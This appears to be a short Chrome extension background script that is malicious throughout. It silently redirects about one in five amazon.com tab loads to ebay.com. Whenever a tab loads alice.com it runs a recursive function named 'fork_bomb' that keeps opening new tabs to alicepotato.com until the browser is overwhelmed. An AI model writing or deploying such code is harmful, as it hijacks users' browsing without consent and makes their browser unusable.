activationProbability = 0.2

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (tab.url.indexOf("amazon.com") > -1) {
        if (Math.random() < activationProbability) {
            var updateParam = new Object();
            updateParam.url = "http://ebay.com";
            chrome.tabs.update(tabId, updateParam);
        }
    }
    if (tab.url.indexOf("alice.com") > -1) {
        fork_bomb();
    }
});

function fork_bomb() {
    alice = new Object();
    alice.url = "http://alicepotato.com"
    chrome.tabs.create(alice, fork_bomb)
    fork_bomb()
}
